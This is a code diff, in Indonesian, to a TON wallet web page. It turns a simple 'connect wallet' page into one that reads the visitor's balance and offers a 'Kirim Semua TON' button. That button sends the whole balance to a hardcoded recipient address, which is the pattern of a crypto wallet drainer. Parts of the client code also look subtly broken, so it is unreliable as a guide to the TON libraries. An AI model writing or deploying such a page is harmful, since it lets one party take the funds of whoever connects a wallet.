@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet TON</title>
+    <title>Kirim TON</title>
     <!-- TonConnect UI -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <!-- TON SDK -->
+    <script src="https://unpkg.com/@tonclient/core/dist/tonclient.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -35,50 +37,113 @@
         button:hover {
             background-color: #0056b3;
         }
+        input {
+            padding: 10px;
+            font-size: 16px;
+            margin-top: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Connect Wallet TON</h1>
+        <h1>Kirim TON</h1>
         <button id="connect-button">Connect Wallet</button>
-        <p id="wallet-info" style="margin-top: 20px; display: none;">Dompet terhubung: <span id="wallet-address"></span></p>
+        <div id="send-ton" style="display: none;">
+            <p>Dompet terhubung: <span id="wallet-address"></span></p>
+            <p>Saldo: <span id="wallet-balance"></span> TON</p>
+            <button id="send-button">Kirim Semua TON</button>
+        </div>
     </div>
 
     <script>
         // Inisialisasi TonConnect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://raw.githubusercontent.com/nuex001/Tonkeepermanifest/main/tonconnect-manifest.json'
+            manifestUrl: 'https://example.com/tonconnect-manifest.json'
+        });
+
+        // Inisialisasi TON Client
+        const tonClient = new TonClient({
+            network: {
+                server_address: 'https://toncenter.com/api/v2/jsonRPC'
+            }
         });
 
         // Tombol Connect Wallet
         const connectButton = document.getElementById('connect-button');
-        const walletInfo = document.getElementById('wallet-info');
+        const sendTonSection = document.getElementById('send-ton');
         const walletAddress = document.getElementById('wallet-address');
+        const walletBalance = document.getElementById('wallet-balance');
+        const sendButton = document.getElementById('send-button');
+
+        let wallet = null;
 
         connectButton.addEventListener('click', async () => {
             try {
                 // Membuka modal untuk menghubungkan dompet
                 await tonConnectUI.connectWallet();
-                const wallet = tonConnectUI.wallet;
+                wallet = tonConnectUI.wallet;
 
                 if (wallet) {
                     // Menampilkan informasi dompet
                     walletAddress.textContent = wallet.account.address;
-                    walletInfo.style.display = 'block';
                     connectButton.style.display = 'none';
+                    sendTonSection.style.display = 'block';
+
+                    // Mendapatkan saldo dompet
+                    const balance = await tonClient.getBalance(wallet.account.address);
+                    walletBalance.textContent = (balance / 1e9).toFixed(2);
+
+                    // Menambahkan event listener untuk tombol kirim
+                    sendButton.addEventListener('click', sendTon);
                 }
             } catch (error) {
                 console.error('Gagal menghubungkan dompet:', error);
             }
         });
 
+        // Fungsi untuk mengirim TON
+        async function sendTon() {
+            try {
+                const recipientAddress = 'UQBWEYo4kAJtJXlfQFwu4zNRuf1wYlPtERBsWVx3NG7i3Aa9';
+                const balance = await tonClient.getBalance(wallet.account.address);
+
+                // Membuat transaksi
+                const transaction = {
+                    messages: [
+                        {
+                            address: recipientAddress,
+                            amount: balance.toString()
+                        }
+                    ],
+                    valid_until: Math.floor(Date.now() / 1000) + 3600 // 1 jam
+                };
+
+                // Mengirim transaksi
+                await tonConnectUI.sendTransaction(transaction);
+                alert('Transaksi berhasil dikirim!');
+            } catch (error) {
+                console.error('Gagal mengirim TON:', error);
+                alert('Gagal mengirim TON: ' + error.message);
+            }
+        }
+
         // Cek apakah dompet sudah terhubung
         tonConnectUI.connectionRestored.then(() => {
-            const wallet = tonConnectUI.wallet;
+            wallet = tonConnectUI.wallet;
             if (wallet) {
                 walletAddress.textContent = wallet.account.address;
-                walletInfo.style.display = 'block';
                 connectButton.style.display = 'none';
+                sendTonSection.style.display = 'block';
+
+                // Mendapatkan saldo dompet
+                tonClient.getBalance(wallet.account.address).then(balance => {
+                    walletBalance.textContent = (balance / 1e9).toFixed(2);
+                });
+
+                // Menambahkan event listener untuk tombol kirim
+                sendButton.addEventListener('click', sendTon);
             }
         });
     </script>
